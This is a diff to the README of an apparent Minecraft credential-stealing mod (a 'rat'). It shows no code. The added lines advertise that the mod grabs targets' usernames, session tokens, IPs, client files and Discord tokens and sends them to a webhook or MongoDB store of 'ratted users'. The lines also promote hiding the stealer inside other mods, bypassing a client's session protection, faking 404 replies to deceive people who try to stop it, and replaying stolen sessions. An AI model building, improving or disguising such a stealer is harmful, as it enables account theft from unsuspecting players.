@@ -13,36 +13,38 @@
 
 </div>
 
-> Check [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth) to login into an MC account with a name, token and uuid combo.
+> Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.
 
 ## Features
-- Grabs the **username, uuid, token and ip** of a target as a *JSON*.
+- Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
 - Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
 - JavaScript backend server which:
-  - Checks if all fields in the json are present.
-  - Validates the token before proceeding.
+  - Checks if all fields in the JSON are present.
+  - Controls requests and filters out spam requests by IPs.
+  - Validates the token with Minecraft Auth servers before proceeding to output the data.
+
+  It also fakes returning 404 codes to make the people think they successfully crashed the server 🤡.
   
-  therefore filtering out spam requests and fake data.
-- Makes nuking/trolling impossible, due to webhook/database urls private.
-- Can be easily be hosted on *Heroku*.
+- Makes nuking/trolling impossible, due to webhook/database urls being private.
+- Can be easily be hosted on *Heroku*. (Tutorial available [here](https://www.youtube.com/watch?v=JWoBSp8XU_8&t=4s&ab_channel=DxxxxY))
 - Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
 - Bypasses PizzaClient's SessionProtection.
+- Can be easily hidden/camouflaged in other mods (1 single class). (Tutorial available [here](https://www.youtube.com/watch?v=XedVI2JHCjA&t=152s&ab_channel=DxxxxY))
 
 - Uses:
   - *Express* for the backend server.
   - *MongoDB* for storing ratted users.
   - *Discord API* for sending messages to webhook.
 
-## What the embed looks like
-![](https://i.imgur.com/EA11Tj7.png)
+## Slick Embed Look
+![embed.png](.github/embed.png)
 
 ## Setup
 > A video tutorial is available [here](https://youtu.be/JWoBSp8XU_8).
 - Server
   1. Clone the repository.
   2. Install dependencies.
-  3. Create a .env file with your webhook/database url.
-  3. Run the server (don't forget to change some strings).
+  3. Run the server.
 
 - Mod
   1. Follow [1.8.9ForgeTemplate#setup](https://github.com/DxxxxY/1.8.9ForgeTemplate#setup) to setup your mod environment.
